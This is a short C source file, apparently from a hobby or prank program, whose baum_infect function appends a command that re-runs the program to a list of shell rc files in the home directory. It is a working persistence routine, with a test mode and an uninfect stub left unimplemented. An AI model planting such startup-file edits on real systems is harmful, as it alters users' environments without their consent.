#include "infect.h"

#include <stdio.h>

#include "baumcommon.h"

int baum_infect(const char *rc_files[], char test_mode) {
	int hret = 0;

	char my_filename[BUFSIZ];
	hret = helper_get_own_name(my_filename, BUFSIZ);
	if (hret != 0) {
		return 1;
	}

	hret = helper_chdir_home();
	if (hret != 0) {
		return 1;
	}

	char text[BUFSIZ];
	snprintf(text, BUFSIZ, "%s --print", my_filename);
	bp("Injecting this text: \n%s\n", text);

	for (size_t i = 0; rc_files[i] != NULL; i++) {
		bp("Writing to file %s", rc_files[i]);
		if (test_mode) continue;

		FILE *f = fopen(rc_files[i], "a");
		if (f) {
			hret = fprintf(f, "\n%s\n", text);
			if (hret > 0) {
				bp("Success");
			} else {
				bp("Failed");
			}
			fclose(f);
		} else {
			bp("  Cannot open file");
		}
	}
	return 0;
}

int baum_uninfect(const char *rc_files[], char test_mode) {
	bp("uninfect not implemented yet");
	return 1;
}

